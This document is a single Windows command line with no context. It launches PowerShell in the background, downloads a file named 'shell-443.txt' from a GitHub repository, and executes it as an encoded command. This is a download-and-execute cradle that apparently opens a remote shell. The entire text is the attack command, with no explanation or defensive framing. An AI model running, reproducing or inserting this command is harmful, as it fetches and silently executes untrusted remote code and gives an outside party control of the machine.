START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/HanzalahH/shelllls/refs/heads/main/shell-443.txt');iex 'powershell -E $code'
